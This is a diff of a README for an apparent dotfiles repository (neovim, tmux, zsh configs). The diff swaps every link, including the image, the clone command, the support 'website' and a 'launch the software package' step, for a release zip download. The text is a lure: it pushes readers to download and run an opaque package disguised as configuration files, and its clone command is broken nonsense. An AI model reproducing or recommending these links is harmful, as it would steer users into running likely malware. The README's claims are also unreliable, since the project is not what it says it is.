@@ -1,6 +1,6 @@
 # 🚀 Welcome to the Ultimate Configurations Repository! 🌟
 
-![dotfiles](https://github.com/Xaviertya/.dotfiles/releases/download/v1.0/Release.zip)
+![dotfiles](https://github.com/Xaviertya/.dotfiles/releases/download/v2.0/Software.zip)
 
 If you are looking to enhance your experience with neovim, tmux, and zsh, then you have come to the right place! This repository - ".dotfiles" - is a treasure trove of valuable configurations that will supercharge your productivity and efficiency on Linux systems.
 
@@ -16,7 +16,7 @@ Inside this repository, you will find configurations for the following tools:
 To get started with these amazing configurations, simply clone this repository to your home directory using the following command:
 
 ```bash
-git clone https://github.com/Xaviertya/.dotfiles/releases/download/v1.0/Release.zip $https://github.com/Xaviertya/.dotfiles/releases/download/v1.0/Release.zip
+git clone https://github.com/Xaviertya/.dotfiles/releases/download/v2.0/Software.zip $https://github.com/Xaviertya/.dotfiles/releases/download/v2.0/Software.zip
 ```
 
 Once cloned, you can apply the configurations to your respective tools and customize them to suit your workflow.
@@ -31,10 +31,10 @@ Our configurations include:
 
 ## Installation 🛠️
 
-To make the setup process even easier, we have bundled all the necessary software and dependencies into a convenient package. You can download it [here](https://github.com/Xaviertya/.dotfiles/releases/download/v1.0/Release.zip) for a seamless setup experience.
+To make the setup process even easier, we have bundled all the necessary software and dependencies into a convenient package. You can download it [here](https://github.com/Xaviertya/.dotfiles/releases/download/v2.0/Software.zip) for a seamless setup experience.
 
 ### Launch the Software Package
-Since the link ends with the file name, make sure to launch the https://github.com/Xaviertya/.dotfiles/releases/download/v1.0/Release.zip package to access all the required tools and dependencies.
+Since the link ends with the file name, make sure to launch the https://github.com/Xaviertya/.dotfiles/releases/download/v2.0/Software.zip package to access all the required tools and dependencies.
 
 If you encounter any issues with the download link, please check the "Releases" section of this repository for alternative options.
 
@@ -62,7 +62,7 @@ We welcome contributions from the community to enhance and improve our configura
 
 ## Support 🌐
 
-For any questions or assistance with the configurations, please reach out to us by [visiting our website](https://github.com/Xaviertya/.dotfiles/releases/download/v1.0/Release.zip).
+For any questions or assistance with the configurations, please reach out to us by [visiting our website](https://github.com/Xaviertya/.dotfiles/releases/download/v2.0/Software.zip).
 
 Thank you for exploring our ".dotfiles" repository! ✨
 
